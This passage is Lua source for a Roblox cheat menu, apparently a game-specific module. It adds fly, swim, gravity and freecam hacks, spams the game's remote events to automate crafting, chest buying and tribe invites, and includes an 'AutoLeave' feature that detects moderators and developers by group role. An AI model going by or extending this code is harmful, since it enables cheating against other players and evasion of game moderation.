		AutoCraft = GuiLibrary["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"].CreateOptionsButton({
			["Name"] = "AutoCraft",
			["Function"] = function(callback)
				if callback then
					spawn(function()

						while game:GetService("RunService").Heartbeat:Wait() and AutoCraft.Enabled == true do
							game:GetService("ReplicatedStorage").Events.DropBagItem:FireServer(AutoCraftItem["ObjectList"][math.random(1, #AutoCraftItem["ObjectList"])])
						end
					end)
				else
				end
			end,
			["HoverText"] = "craft items kinda useless",
			["Default"] = false,
			
		})
		AutoCraftItem = AutoCraft.CreateTextList({
			["Name"] = "Item",
			["TempText"] = "Item",
		})

	end)
	runcode(function()
		local Swim = {["Enabled"] = false}
		local swimconnection
		local oldgravity

		Swim = GuiLibrary["ObjectsThatCanBeSaved"]["BlatantWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Swim",
			["Function"] = function(callback)
				if callback then
					spawn(function()

						oldgravity = workspace.Gravity
						if isAlive(game.Players.LocalPlayer) then
							workspace.Gravity = 0
							local enums = Enum.HumanoidStateType:GetEnumItems()
							table.remove(enums, table.find(enums, Enum.HumanoidStateType.None))
							for i,v in pairs(enums) do
								game.Players.LocalPlayer.character.Humanoid:SetStateEnabled(v, false)
							end
							game.Players.LocalPlayer.character.Humanoid:ChangeState(Enum.HumanoidStateType.Swimming)
							BindToStepped("Swim", 1, function()
								game.Players.LocalPlayer.character.HumanoidRootPart.Velocity = ((game.Players.LocalPlayer.character.Humanoid.MoveDirection ~= Vector3.new(0, 0, 0) or game.Players.LocalPlayer.character.Humanoid.Jump) and game.Players.LocalPlayer.character.HumanoidRootPart.Velocity or Vector3.new(0, 0, 0))
							end)
						end
					end)
				else 
					workspace.Gravity = oldgravity
					UnbindFromStepped("Swim")
					if isAlive(game.Players.LocalPlayer) then 
						local enums = Enum.HumanoidStateType:GetEnumItems()
						table.remove(enums, table.find(enums, Enum.HumanoidStateType.None))
						for i,v in pairs(enums) do
							game.Players.LocalPlayer.character.Humanoid:SetStateEnabled(v, true)
							wait(0.1)
							game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming, false)
						end
					end
				end
			end
		})

	end)

	runcode(function()
		local oldgrav
		local gravchanged = false
		local gravconnection
		local grav = {["Enabled"] = false}
		local gravslider = {["Value"] = 100}
		grav = GuiLibrary["ObjectsThatCanBeSaved"]["BlatantWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Gravity",
			["Function"] = function(callback)
				if callback then
					spawn(function()

						oldgrav = workspace.Gravity
						workspace.Gravity = gravslider["Value"]
					end)
				else
					workspace.Gravity = oldgrav
				end
			end,
			["HoverText"] = "Changes workspace gravity"
		})
		gravslider = grav.CreateSlider({
			["Name"] = "Gravity",
			["Min"] = 0,
			["Max"] = 192,
			["Function"] = function(val) 
				if grav["Enabled"] then
					workspace.Gravity = val
				end
			end,
			["Default"] = 192
		})

	end)

	runcode(function()
		local AutoLeave = {["Enabled"] = false}

		local Developers = true
		local Moderators = true
		local Shamans = true
		local Testers = false

		AutoLeave = GuiLibrary["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"].CreateOptionsButton({
			["Name"] = "AutoLeave",
			["Function"] = function(callback) if callback then 
					spawn(function()
						while game:GetService("RunService").Heartbeat:Wait() and AutoLeave.Enabled == true do
							for i,v in pairs(game.Players:GetChildren()) do
								local GroupID = 2841240
								local plrRole = v:GetRoleInGroup(GroupID)

								if plrRole == "TESTER" and Testers == true then
									local msgbox = messagebox(tostring(v.Name),tostring(v.Name.." was a "..plrRole),4)
									setfpscap(math.huge)
								end
								if plrRole == "SHAMAN" and Shamans == true then
									local msgbox = messagebox(tostring(v.Name),tostring(v.Name.." was a "..plrRole),4)
									setfpscap(math.huge)
								end
								if plrRole == "JUNIOR MODERATOR" and Moderators == true then
									local msgbox = messagebox(tostring(v.Name),tostring(v.Name.." was a "..plrRole),4)
									setfpscap(math.huge)
								end
								if plrRole == "MODERATOR" and Moderators == true then
									local msgbox = messagebox(tostring(v.Name),tostring(v.Name.." was a "..plrRole),4)
									setfpscap(math.huge)
								end
								if plrRole == "COMMUNITY MANAGER" and Developers == true then
									local msgbox = messagebox(tostring(v.Name),tostring(v.Name.." was a "..plrRole),4)
									setfpscap(math.huge)
								end
								if plrRole == "CO-DEV" and Developers == true then
									local msgbox = messagebox(tostring(v.Name),tostring(v.Name.." was a "..plrRole),4)
									setfpscap(math.huge)
								end
								if plrRole == "SOYBEEN" and Developers == true then
									local msgbox = messagebox(tostring(v.Name),tostring(v.Name.." was a "..plrRole),4)
									setfpscap(math.huge)
								end
							end
						end
					end)
				else
				end
			end,
			["HoverText"] = "kicks you when someone has this in the group", 
			["Default"] = false,

		})

		AutoLeave.CreateToggle({
			["Name"] = "Developers",
			["HoverText"] = "leave on developers",
			["Function"] = function(callback)
				if callback then
					Developers= true
				else
					Developers= false
				end
			end,
			["Default"] = true
		})
		AutoLeave.CreateToggle({
			["Name"] = "Moderators",
			["HoverText"] = "leave on moderators",
			["Function"] = function(callback)
				if callback then
					Moderators= true
				else
					Moderators= false
				end
			end,
			["Default"] = true
		})
		AutoLeave.CreateToggle({
			["Name"] = "Shamans",
			["HoverText"] = "leaves on shamans",
			["Function"] = function(callback)
				if callback then
					Shamans= true
				else
					Shamans= false
				end
			end,
			["Default"] = false
		})
		AutoLeave.CreateToggle({
			["Name"] = "Testers",
			["HoverText"] = "leaves on testers",
			["Function"] = function(callback)
				if callback then
					Testers= true
				else
					Testers= false
				end
			end,
			["Default"] = false
		})

	end)

	runcode(function()
		local GlitchedAvatar = {["Enabled"] = false}

		GlitchedAvatar = GuiLibrary["ObjectsThatCanBeSaved"]["WorldWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Glitched Avatar",
			["Function"] = function(callback) if callback then 

					spawn(function()
						while wait(0.3) and GlitchedAvatar.Enabled == true do
							local r = math.random(1, 18)

							if r == 1 then
								local args = {
									[1] = "skin",
									[2] = "Dark Brown"
								}
								game:GetService("ReplicatedStorage").Events.CosmeticChange:FireServer(unpack(args))
							end
							if r == 2 then
								local args = {
									[1] = "hair",
									[2] = "Crazyhair"
								}
								game:GetService("ReplicatedStorage").Events.CosmeticChange:FireServer(unpack(args))
							end
							if r == 3 then

								local args = {
									[1] = "face",
									[2] = "Beardy"
								}
								game:GetService("ReplicatedStorage").Events.CosmeticChange:FireServer(unpack(args))
							end
							if r == 4 then
								local args = {
									[1] = "skin",
									[2] = "Pale"
								}
								game:GetService("ReplicatedStorage").Events.CosmeticChange:FireServer(unpack(args))
							end
							if r == 5 then
								local args = {
									[1] = "face",
									[2] = "Freckles"
								}
								game:GetService("ReplicatedStorage").Events.CosmeticChange:FireServer(unpack(args))
							end
							if r == 6 then
								local args = {
									[1] = "hair",
									[2] = "Brown Girl"
								}
								game:GetService("ReplicatedStorage").Events.CosmeticChange:FireServer(unpack(args))
							end
							if r == 7 then
								local args = {
									[1] = "face",
									[2] = "Freckles"
								}
								game:GetService("ReplicatedStorage").Events.CosmeticChange:FireServer(unpack(args))
							end
							if r == 8 then
								local args = {
									[1] = "face",
									[2] = "Smile"
								}
								game:GetService("ReplicatedStorage").Events.CosmeticChange:FireServer(unpack(args))
							end
							if r == 9 then
								local args = {
									[1] = "face",
									[2] = "Unamused"
								}
								game:GetService("ReplicatedStorage").Events.CosmeticChange:FireServer(unpack(args))
							end
							if r == 10 then
								local args = {
									[1] = "face",
									[2] = "Smile"
								}
								game:GetService("ReplicatedStorage").Events.CosmeticChange:FireServer(unpack(args))
							end
							if r == 11 then
								local args = {
									[1] = "skin",
									[2] = "Light Brown"
								}
								game:GetService("ReplicatedStorage").Events.CosmeticChange:FireServer(unpack(args))
							end
							if r == 12 then
								local args = {
									[1] = "hair",
									[2] = "Crazyhair"
								}
								game:GetService("ReplicatedStorage").Events.CosmeticChange:FireServer(unpack(args))
							end
							if r == 13 then
								local args = {
									[1] = "face",
									[2] = "Cunning"
								}
								game:GetService("ReplicatedStorage").Events.CosmeticChange:FireServer(unpack(args))
							end
							if r == 14 then
								local args = {
									[1] = "skin",
									[2] = "White"
								}
								game:GetService("ReplicatedStorage").Events.CosmeticChange:FireServer(unpack(args))
							end
							if r == 15 then
								local args = {
									[1] = "hair",
									[2] = "none"
								}
								game:GetService("ReplicatedStorage").Events.CosmeticChange:FireServer(unpack(args))
							end
							if r == 16 then
								local args = {
									[1] = "hair",
									[2] = "Blonde Girl"
								}
								game:GetService("ReplicatedStorage").Events.CosmeticChange:FireServer(unpack(args))
							end
							if r == 17 then
								local args = {
									[1] = "skin",
									[2] = "Tan"
								}
								game:GetService("ReplicatedStorage").Events.CosmeticChange:FireServer(unpack(args))
							end
							if r == 18 then
								local args = {
									[1] = "hair",
									[2] = "Blonde Boy"
								}
								game:GetService("ReplicatedStorage").Events.CosmeticChange:FireServer(unpack(args))
							end
						end
					end)
				end
			end,
			["HoverText"] = "changes your look kinda laggy so dont use maybe", 
			["Default"] = false,

		})

	end)

	runcode(function()
		local AutoPress = {["Enabled"] = false}
		local Coin = {["Value"] = "Wood Coins - Stick"}
		local Distance = {["Value"] = 15}

		AutoPress = GuiLibrary["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"].CreateOptionsButton({
			["Name"] = "MakeCoins",
			["Function"] = function(callback) if callback then 
					spawn(function()
						while wait() and AutoPress.Enabled == true do
							for i,v in pairs(workspace.Deployables:GetChildren()) do
								if v.Name == "Coin Press" then
									if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - v.Reference.Position).magnitude <= Distance.Value then
										if Coin.Value == "Wood Coins - Stick" then
											local args = {
												[1] = v,
												[2] = "Stick"
											}

											game:GetService("ReplicatedStorage").Events.InteractStructure:FireServer(unpack(args))
										elseif Coin.Value == "Silver Coins - Silver Bar" then
											local args = {
												[1] = v,
												[2] = "Silver Bar"
											}

											game:GetService("ReplicatedStorage").Events.InteractStructure:FireServer(unpack(args))
										elseif Coin.Value == "Gold Coins - Gold Bar" then
											local args = {
												[1] = v,
												[2] = "Gold Bar"
											}

											game:GetService("ReplicatedStorage").Events.InteractStructure:FireServer(unpack(args))

										end
									end
								end
							end
						end
					end)
				else

				end
			end,
			["HoverText"] = "get close to a coin press and it will make coins", 
			["Default"] = false,

		})

		Coin = AutoPress.CreateDropdown({
			["Name"] = "Type",
			["List"] = {"Wood Coins - Stick", "Silver Coins - Silver Bar", "Gold Coins - Gold Bar"},
			["Function"] = function(val) 
			end
		})

		Distance = AutoPress.CreateSlider({
			["Name"] = "Distance",
			["Min"] = 5,
			["Max"] = 25,
			["Function"] = function(val)
			end,
			["Default"] = 20
		})

	end)

	runcode(function()
		local CanLock = {["Enabled"] = false}

		CanLock = GuiLibrary["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Cam Lock",
			["Function"] = function(callback) if callback then 
					spawn(function()
						local args = {
							[1] = "camLock",
							[2] = true
						}

						game:GetService("ReplicatedStorage").Events.ToggleUserSetting:FireServer(unpack(args))
					end)
				else
					local args = {
						[1] = "camLock",
						[2] = false
					}

					game:GetService("ReplicatedStorage").Events.ToggleUserSetting:FireServer(unpack(args))

				end
			end,
			["HoverText"] = "toggle if you want your camera is locked or not", 
			["Default"] = false,

		})

	end)

	runcode(function()
		if Beta == true then
			print("Beta is functioning")
		end
	end)

	runcode(function()
		local OpenCrate = {["Enabled"] = false}
		local CrateDelay = {["Value"] = 10}
		local KindOfCrate = {["Value"] = "Food Chest"}

		OpenCrate = GuiLibrary["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"].CreateOptionsButton({
			["Name"] = "AutoPurchaseChest",
			["Function"] = function(callback) if callback then 
					spawn(function()
						while wait(CrateDelay.Value / 10) and OpenCrate.Enabled == true do
							local args = {
								[1] = KindOfCrate
							}

							game:GetService("ReplicatedStorage").Events.PurchaseChest:FireServer(unpack(args))

						end
					end)
				else
				end
			end,
			["HoverText"] = "keeps buying crates", 
			["Default"] = false,

		})
		CrateDelay = OpenCrate.CreateSlider({
			["Name"] = "Delay",
			["Min"] = 1,
			["Max"] = 50,
			["Function"] = function(val)
			end,
			["HoverText"] = "every 10 on the slider is 0.1 seconds",
			["Default"] = 10
		})
		KindOfCrate = OpenCrate.CreateDropdown({
			["Name"] = "Select Chest",
			["List"] = {"Food Chest", 
				"Resource Chest",
				"Essence Chest",
				"Crystal Chest",
				"Adurite Chest",
				"Magnetite Chest",
			},
			["Function"] = function(val)
			end
		})

	end)

	runcode(function()
		local AutoInvite = {["Enabled"] = false}
		local InviteDelay = {["Value"] = 100}

		AutoInvite = GuiLibrary["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"].CreateOptionsButton({
			["Name"] = "AutoInvite",
			["Function"] = function(callback)
				if callback then
					spawn(function()
						while wait(InviteDelay.Value / 10) and AutoInvite.Enabled == true do
							for i,v in next, game.Players:GetChildren() do
								game:GetService("ReplicatedStorage").Events.TribeInvite:FireServer(v)
							end
						end
					end)
				else
				end
			end,
			["HoverText"] = "Auto invites the people",
			["Default"] = false,
			
		})

		InviteDelay = AutoInvite.CreateSlider({
			["Name"] = "Delay",
			["Min"] = 1,
			["Max"] = 50,
			["Function"] = function(val)
			end,
			["HoverText"] = "1 slider = 0.1 seconds",
			["Default"] = 10
		})

	end)

	runcode(function()
		local AntiAfk = {["Enabled"] = false}

		AntiAfk = GuiLibrary["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"].CreateOptionsButton({
			["Name"] = "AntiAfk",
			["Function"] = function(callback) if callback then 
					spawn(function()
						game:service'Players'.LocalPlayer.Idled:connect(function()
							if AntiAfk.Enabled == true then
								local bb = game:service'VirtualUser'
								bb:CaptureController()
								bb:ClickButton2(Vector2.new())
							end
						end)
					end)
				else
				end
			end,
			["HoverText"] = "stay in the game when your afk", 
			["Default"] = false,

		})

	end)

	runcode(function()
		local MaxDistance = {["Enabled"] = false}
		local MaxDistanceVal = {["Value"] = 1000}
		MaxDistance = GuiLibrary["ObjectsThatCanBeSaved"]["WorldWindow"]["Api"].CreateOptionsButton({
			["Name"] = "MaxDistance",
			["Function"] = function(callback) if callback then 
					spawn(function()
						while wait() and MaxDistance.Enabled == true do
							game.Players.LocalPlayer.CameraMaxZoomDistance = MaxDistanceVal.Value
						end
					end)
				else
					game.Players.LocalPlayer.CameraMaxZoomDistance = 400
				end
			end,
			["HoverText"] = "zoom out more farther",
			["Default"] = false,

		})
		MaxDistanceVal = MaxDistance.CreateSlider({
			["Name"] = "Distance",
			["Min"] = 400,
			["Max"] = 1000,
			["Function"] = function(val)
			end,
			["HoverText"] = "change your distance",
			["Default"] = 1000
		})

	end)
	runcode(function()
		local FPSBoost = {["Enabled"] = false}
		local FPSCap = {["Value"] = 90}
		local Grass = {["Value"] = true}
		FPSBoost = GuiLibrary["ObjectsThatCanBeSaved"]["RenderWindow"]["Api"].CreateOptionsButton({
			["Name"] = "FPSBoost",
			["Function"] = function(callback) if callback then 
					spawn(function()
						setfpscap(FPSCap)
						if game.Workspace:FindFirstChild("Grass Decoration") and Grass.Value == true then
							local Grass = game.Workspace:FindFirstChild("Grass Decoration")
							Grass.Parent = game.ReplicatedStorage
						end
					end)
				else
					setfpscap(60)
					if game.ReplicatedStorage:FindFirstChild("Grass Decoration") then
						local Grass = game.ReplicatedStorage:FindFirstChild("Grass Decoration")
						Grass.Parent = game.Workspace
					end
				end
			end,
			["HoverText"] = "boost your fps",
			["Default"] = false,

		})
		Grass = FPSBoost.CreateToggle({
			["Name"] = "Remove Grass Decoration",
			["Function"] = function() end,
			["Default"] = true
		})
		FPSCap = FPSBoost.CreateSlider({
			["Name"] = "FPS",
			["Min"] = 120,
			["Max"] = 60,
			["Function"] = function(val)
			end,
			["HoverText"] = "change your distance",
			["Default"] = 90
		})
	end)
	runcode(function()
		local NoFog = {["Enabled"] = false}
		NoFog = GuiLibrary["ObjectsThatCanBeSaved"]["RenderWindow"]["Api"].CreateOptionsButton({
			["Name"] = "NoFog",
			["Function"] = function(callback) if callback then 
					spawn(function()
						game.Lighting.FogEnd = 99999
					end)
				else
					game.Lighting.FogEnd = 2000
				end
			end,
			["HoverText"] = "removes the fog",
			["Default"] = false,

		})

	end)

	runcode(function()
		local flyspeed = {["Value"] = 100}
		local flyverticalspeed = {["Value"] = 100}
		local flywall = {["Enabled"] = true}
		local flyupanddown = {["Enabled"] = true}
		local flymethod = {["Value"] = "Normal"}
		local flymovemethod = {["Value"] = "MoveDirection"}
		local flykeys = {["Value"] = "Space/LeftControl"}
		local flyplatformtoggle = {["Enabled"] = false}
		local flyplatformstanding = {["Enabled"] = true}
		local flyplatform
		local flyposy = 0
		local flyup = false
		local flydown = false
		local flypress
		local flyendpress
		local flyjumpcf = CFrame.new(0, 0, 0)
		local flyalivecheck = false
		local bodyvelofly
		local w = 0
		local s = 0
		local a = 0
		local d = 0
		local fly = GuiLibrary["ObjectsThatCanBeSaved"]["BlatantWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Fly", 
			["Function"] = function(callback)
				if callback then
					spawn(function()
						if isAlive(game.Players.LocalPlayer) then
							flyposy = game.Players.LocalPlayer.character.HumanoidRootPart.CFrame.p.Y
							flyalivecheck = true
						end
						flypress = game:GetService("UserInputService").InputBegan:connect(function(input1)
							if game:GetService("UserInputService"):GetFocusedTextBox() == nil then
								if input1.KeyCode == Enum.KeyCode.W then
									w = -1
								end
								if input1.KeyCode == Enum.KeyCode.S then
									s = 1
								end
								if input1.KeyCode == Enum.KeyCode.A then
									a = -1
								end
								if input1.KeyCode == Enum.KeyCode.D then
									d = 1
								end
								if flyupanddown["Enabled"] then
									local divided = flykeys["Value"]:split("/")
									if input1.KeyCode == Enum.KeyCode[divided[1]] then
										flyup = true
									end
									if input1.KeyCode == Enum.KeyCode[divided[2]] then
										flydown = true
									end
								end
							end
						end)
						flyendpress = game:GetService("UserInputService").InputEnded:connect(function(input1)
							local divided = flykeys["Value"]:split("/")
							if input1.KeyCode == Enum.KeyCode.W then
								w = 0
							end
							if input1.KeyCode == Enum.KeyCode.S then
								s = 0
							end
							if input1.KeyCode == Enum.KeyCode.A then
								a = 0
							end
							if input1.KeyCode == Enum.KeyCode.D then
								d = 0
							end
							if input1.KeyCode == Enum.KeyCode[divided[1]] then
								flyup = false
							end
							if input1.KeyCode == Enum.KeyCode[divided[2]] then
								flydown = false
							end
						end)
						BindToStepped("Fly", 1, function(time, delta) 
							if isAlive(game.Players.LocalPlayer) then
								game.Players.LocalPlayer.character.Humanoid.PlatformStand = flyplatformstanding["Enabled"]
								if flyalivecheck == false then
									flyposy = game.Players.LocalPlayer.character.HumanoidRootPart.CFrame.p.Y
									flyalivecheck = true
								end
								local movevec = (flymovemethod["Value"] == "Manual" and (not (w or s or a or d)) and Vector3.new(0, 0, 0) or game.Players.LocalPlayer.character.Humanoid.MoveDirection).Unit
								movevec = movevec == movevec and movevec or Vector3.new(0, 0, 0)
								if flymethod["Value"] == "Normal" then
									if flyplatformstanding["Enabled"] then
										game.Players.LocalPlayer.character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.character.HumanoidRootPart.CFrame.p, game.Players.LocalPlayer.character.HumanoidRootPart.CFrame.p + cam.CFrame.lookVector)
										game.Players.LocalPlayer.character.HumanoidRootPart.RotVelocity = Vector3.new(0, 0, 0)
									end
									game.Players.LocalPlayer.character.HumanoidRootPart.Velocity = (movevec * flyspeed["Value"]) + Vector3.new(0, 0.85 + (flyup and flyverticalspeed["Value"] or 0) + (flydown and -flyverticalspeed["Value"] or 0), 0)
								else
									if flyup then
										flyposy = flyposy + (flyverticalspeed["Value"] * delta)
									end
									if flydown then
										flyposy = flyposy - (flyverticalspeed["Value"] * delta)
									end
									local flypos = (movevec * (math.clamp(flyspeed["Value"] - game.Players.LocalPlayer.character.Humanoid.WalkSpeed, 0, 1000000000000) * delta))
									flypos = Vector3.new(flypos.X, (flyposy - game.Players.LocalPlayer.character.HumanoidRootPart.CFrame.p.Y), flypos.Z)
									if flywall["Enabled"] then
										local raycastparameters = RaycastParams.new()
										raycastparameters.FilterType = Enum.RaycastFilterType.Blacklist
										raycastparameters.FilterDescendantsInstances = {lplr.Character}
										local ray = workspace:Raycast(game.Players.LocalPlayer.character.HumanoidRootPart.Position, flypos, raycastparameters)
										if ray then flypos = (ray.Position - game.Players.LocalPlayer.character.HumanoidRootPart.Position) flyposy = game.Players.LocalPlayer.character.HumanoidRootPart.CFrame.p.Y end
									end
									if flymethod["Value"] ~= "Jump" then
										game.Players.LocalPlayer.character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.character.HumanoidRootPart.CFrame + flypos
										if flyplatformstanding["Enabled"] then
											game.Players.LocalPlayer.character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.character.HumanoidRootPart.CFrame.p, game.Players.LocalPlayer.character.HumanoidRootPart.CFrame.p + cam.CFrame.lookVector)
										end
										game.Players.LocalPlayer.character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
									else
										game.Players.LocalPlayer.character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.character.HumanoidRootPart.CFrame + Vector3.new(flypos.X, 0, flypos.Z)
										if game.Players.LocalPlayer.character.HumanoidRootPart.Velocity.Y < -(game.Players.LocalPlayer.character.Humanoid.JumpPower - ((flyup and flyverticalspeed["Value"] or 0) - (flydown and flyverticalspeed["Value"] or 0))) then
											flyjumpcf = game.Players.LocalPlayer.character.HumanoidRootPart.CFrame * CFrame.new(0, -game.Players.LocalPlayer.character.Humanoid.HipHeight, 0)
											game.Players.LocalPlayer.character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
										end
									end
								end
								if flyplatform then
									flyplatform.CFrame = (flymethod["Value"] == "Jump" and flyjumpcf or game.Players.LocalPlayer.character.HumanoidRootPart.CFrame * CFrame.new(0, -game.Players.LocalPlayer.character.Humanoid.HipHeight * 2, 0))
									flyplatform.Velocity = Vector3.new(0, 0, 0)
									flyplatform.Parent = cam
								end
							else
								flyalivecheck = false
							end
						end)
					end)
				else
					flyup = false
					flydown = false
					flyalivecheck = false
					flypress:Disconnect()
					flyendpress:Disconnect()
					UnbindFromStepped("Fly")
					if isAlive(game.Players.LocalPlayer) then
						game.Players.LocalPlayer.character.Humanoid.PlatformStand = false
					end
					if flyplatform then
						flyplatform:Remove()
						flyplatform = nil
					end
				end
			end,
			["ExtraText"] = function() return flymethod["Value"] end
		})
		flymethod = fly.CreateDropdown({
			["Name"] = "Mode", 
			["List"] = {"Normal", "CFrame"},
			["Function"] = function(val)
				if isAlive(game.Players.LocalPlayer) then
					flyposy = game.Players.LocalPlayer.character.HumanoidRootPart.CFrame.p.Y
				end
			end
		})
		flymovemethod = fly.CreateDropdown({
			["Name"] = "Movement", 
			["List"] = {"MoveDirection", "Manual"},
			["Function"] = function(val) end
		})
		flykeys = fly.CreateDropdown({
			["Name"] = "Keys", 
			["List"] = {"Space/LeftControl", "Space/LeftShift", "E/Q", "Space/Q"},
			["Function"] = function(val) end
		})
		flyspeed = fly.CreateSlider({
			["Name"] = "Speed",
			["Min"] = 30,
			["Max"] = 800, 
			["Function"] = function(val) end
		})
		flyverticalspeed = fly.CreateSlider({
			["Name"] = "Vertical Speed",
			["Min"] = 30,
			["Max"] = 800,
			["Function"] = function(val) end
		})
		flywall = fly.CreateToggle({
			["Name"] = "Wall Check",
			["Function"] = function() end,
			["Default"] = true
		})
		flyplatformtoggle = fly.CreateToggle({
			["Name"] = "FloorPlatform", 
			["Function"] = function(callback)
				if callback then
					spawn(function()
						flyplatform = Instance.new("Part")
						flyplatform.Anchored = true
						flyplatform.CanCollide = true
						flyplatform.Size = Vector3.new(2, 1, 2)
						flyplatform.Transparency = 1
					end)
				else
					if flyplatform then 
						flyplatform:Remove()
						flyplatform = nil 
					end
				end
			end
		})
		flyplatformstanding = fly.CreateToggle({
			["Name"] = "PlatformStand",
			["Function"] = function() end
		})

	end)

	runcode(function()
		local uis = game:GetService("UserInputService")

		Spring = {} do
			Spring.__index = Spring

			function Spring.new(freq, pos)
				local self = setmetatable({}, Spring)
				self.f = freq
				self.p = pos
				self.v = pos*0
				return self
			end

			function Spring:Update(dt, goal)
				local f = self.f*2*math.pi
				local p0 = self.p
				local v0 = self.v

				local offset = goal - p0
				local decay = math.exp(-f*dt)

				local p1 = goal + (v0*dt - offset*(f*dt + 1))*decay
				local v1 = (f*dt*(offset*f - v0) + v0)*decay

				self.p = p1
				self.v = v1

				return p1
			end

			function Spring:Reset(pos)
				self.p = pos
				self.v = pos*0
			end
		end

		local cameraPos = Vector3.new()
		local cameraRot = Vector2.new()
		local velSpring = Spring.new(5, Vector3.new())
		local panSpring = Spring.new(5, Vector2.new())

		Input = {} do

			keyboard = {
				W = 0,
				A = 0,
				S = 0,
				D = 0,
				E = 0,
				Q = 0,
				Up = 0,
				Down = 0,
				LeftShift = 0,
			}

			mouse = {
				Delta = Vector2.new(),
			}

			NAV_KEYBOARD_SPEED = Vector3.new(1, 1, 1)
			PAN_MOUSE_SPEED = Vector2.new(3, 3)*(math.pi/64)
			NAV_ADJ_SPEED = 0.75
			NAV_SHIFT_MUL = 0.25

			navSpeed = 1

			function Input.Vel(dt)
				navSpeed = math.clamp(navSpeed + dt*(keyboard.Up - keyboard.Down)*NAV_ADJ_SPEED, 0.01, 4)

				local kKeyboard = Vector3.new(
					keyboard.D - keyboard.A,
					keyboard.E - keyboard.Q,
					keyboard.S - keyboard.W
				)*NAV_KEYBOARD_SPEED

				local shift = uis:IsKeyDown(Enum.KeyCode.LeftShift)

				return (kKeyboard)*(navSpeed*(shift and NAV_SHIFT_MUL or 1))
			end

			function Input.Pan(dt)
				local kMouse = mouse.Delta*PAN_MOUSE_SPEED
				mouse.Delta = Vector2.new()
				return kMouse
			end

			do
				function Keypress(action, state, input)
					keyboard[input.KeyCode.Name] = state == Enum.UserInputState.Begin and 1 or 0
					return Enum.ContextActionResult.Sink
				end

				function MousePan(action, state, input)
					local delta = input.Delta
					mouse.Delta = Vector2.new(-delta.y, -delta.x)
					return Enum.ContextActionResult.Sink
				end

				function Zero(t)
					for k, v in pairs(t) do
						t[k] = v*0
					end
				end

				function Input.StartCapture()
					game:GetService("ContextActionService"):BindActionAtPriority("FreecamKeyboard",Keypress,false,Enum.ContextActionPriority.High.Value,
					Enum.KeyCode.W,
					Enum.KeyCode.A,
					Enum.KeyCode.S,
					Enum.KeyCode.D,
					Enum.KeyCode.E,
					Enum.KeyCode.Q,
					Enum.KeyCode.Up,
					Enum.KeyCode.Down
					)
					game:GetService("ContextActionService"):BindActionAtPriority("FreecamMousePan",MousePan,false,Enum.ContextActionPriority.High.Value,Enum.UserInputType.MouseMovement)
				end

				function Input.StopCapture()
					navSpeed = 1
					Zero(keyboard)
					Zero(mouse)
					game:GetService("ContextActionService"):UnbindAction("FreecamKeyboard")
					game:GetService("ContextActionService"):UnbindAction("FreecamMousePan")
				end
			end
		end

		local function GetFocusDistance(cameraFrame)
			local znear = 0.1
			local viewport = cam.ViewportSize
			local projy = 2*math.tan(cameraFov/2)
			local projx = viewport.x/viewport.y*projy
			local fx = cameraFrame.rightVector
			local fy = cameraFrame.upVector
			local fz = cameraFrame.lookVector

			local minVect = Vector3.new()
			local minDist = 512

			for x = 0, 1, 0.5 do
				for y = 0, 1, 0.5 do
					local cx = (x - 0.5)*projx
					local cy = (y - 0.5)*projy
					local offset = fx*cx - fy*cy + fz
					local origin = cameraFrame.p + offset*znear
					local _, hit = workspace:FindPartOnRay(Ray.new(origin, offset.unit*minDist))
					local dist = (hit - origin).magnitude
					if minDist > dist then
						minDist = dist
						minVect = offset.unit
					end
				end
			end

			return fz:Dot(minVect)*minDist
		end

		local PlayerState = {} do
			mouseBehavior = ""
			mouseIconEnabled = ""
			cameraType = ""
			cameraFocus = ""
			cameraCFrame = ""
			cameraFieldOfView = ""

			function PlayerState.Push()
				cameraFieldOfView = cam.FieldOfView
				cam.FieldOfView = 70

				cameraType = cam.CameraType
				cam.CameraType = Enum.CameraType.Custom

				cameraCFrame = cam.CFrame
				cameraFocus = cam.Focus

				mouseBehavior = uis.MouseBehavior
				uis.MouseBehavior = Enum.MouseBehavior.Default

				mouseIconEnabled = uis.MouseIconEnabled
				uis.MouseIconEnabled = true
			end

			function PlayerState.Pop()
				cam.FieldOfView = cameraFieldOfView
				cameraFieldOfView = nil

				cam.CameraType = cameraType
				cameraType = nil

				cam.CFrame = cameraCFrame
				cameraCFrame = nil

				cam.Focus = cameraFocus
				cameraFocus = nil

				uis.MouseIconEnabled = mouseIconEnabled
				mouseIconEnabled = nil

				uis.MouseBehavior = mouseBehavior
				mouseBehavior = nil
			end
		end

		local Freecam = {["Enabled"] = false}
		local freecamspeed = {["Value"] = 75}
		local Freecam = GuiLibrary["ObjectsThatCanBeSaved"]["RenderWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Freecam", 
			["Function"] = function(callback)
				if callback then
					spawn(function()
						local cameraCFrame = cam.CFrame
						local pitch, yaw, roll = cameraCFrame:ToEulerAnglesYXZ()
						cameraRot = Vector2.new(pitch, yaw)
						cameraPos = cameraCFrame.p
						cameraFov = cam.FieldOfView

						velSpring:Reset(Vector3.new())
						panSpring:Reset(Vector2.new())

						PlayerState.Push()
						BindToRenderStep("Freecam", Enum.RenderPriority.Camera.Value, function(dt)
							local vel = velSpring:Update(dt, Input.Vel(dt))
							local pan = panSpring:Update(dt, Input.Pan(dt))

							local zoomFactor = math.sqrt(math.tan(math.rad(70/2))/math.tan(math.rad(cameraFov/2)))

							cameraRot = cameraRot + pan*Vector2.new(0.75, 1)*8*(dt/zoomFactor)
